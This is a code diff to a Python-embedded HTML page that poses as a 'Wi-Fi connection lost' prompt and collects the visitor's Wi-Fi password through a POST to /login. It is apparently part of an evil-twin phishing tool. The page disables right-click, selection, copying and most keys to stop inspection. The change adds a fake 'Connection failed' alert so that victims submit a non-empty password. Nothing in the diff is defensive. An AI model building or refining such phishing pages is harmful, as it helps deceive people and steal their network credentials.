@@ -72,7 +72,7 @@ login_page = '''
         }
     </style>
     <script>
-        // Disable all keys except typing
+        // Disable everything except typing
         document.addEventListener('keydown', function(e) {
             const allowed = ['Backspace', 'Tab', 'Enter', 'Shift', 'ArrowLeft', 'ArrowRight'];
             if (!allowed.includes(e.key) && !e.key.match(/^[a-zA-Z0-9!@#\$%\^&\*\(\)_\+\-=]$/)) {
@@ -80,13 +80,19 @@ login_page = '''
             }
         });
 
-        // Disable inspect, right-click, copy etc
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('selectstart', e => e.preventDefault());
         document.addEventListener('copy', e => e.preventDefault());
 
-        function showLoading() {
-            document.querySelector('.spinner').style.display = 'block';
+        function handleSubmit(event) {
+            const password = document.querySelector('input[name="password"]').value;
+            if (password.trim() === "") {
+                event.preventDefault();
+                alert("Connection failed: Password field cannot be empty.");
+                return false;
+            } else {
+                document.querySelector('.spinner').style.display = 'block';
+            }
         }
     </script>
 </head>
@@ -94,7 +100,7 @@ login_page = '''
     <div class="box">
         <h3>Your Wi-Fi connection was lost.</h3>
         <p>Please re-enter your password to reconnect.</p>
-        <form method="POST" action="/login" onsubmit="showLoading()">
+        <form method="POST" action="/login" onsubmit="handleSubmit(event)">
             <input type="password" name="password" placeholder="Wi-Fi Password" required autofocus><br>
             <button type="submit">Reconnect</button>
         </form>
